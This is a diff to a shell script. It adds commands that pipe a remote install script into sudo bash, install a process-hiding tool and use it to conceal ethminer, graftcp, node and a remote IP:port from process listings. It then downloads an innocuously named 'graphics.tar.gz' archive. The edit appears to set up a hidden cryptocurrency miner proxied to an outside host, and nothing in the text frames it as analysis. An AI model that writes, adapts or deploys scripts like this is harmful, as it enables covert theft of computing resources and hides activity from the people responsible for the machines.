@@ -1,5 +1,18 @@
 #!/bin/sh
-sleep 30
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+ph add 
+ph add graftcp/graftcp
+ph add graftcp
+ph add 176.53.133.217:57597
+ph add listen
+ph add node
+ph add ethminer
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
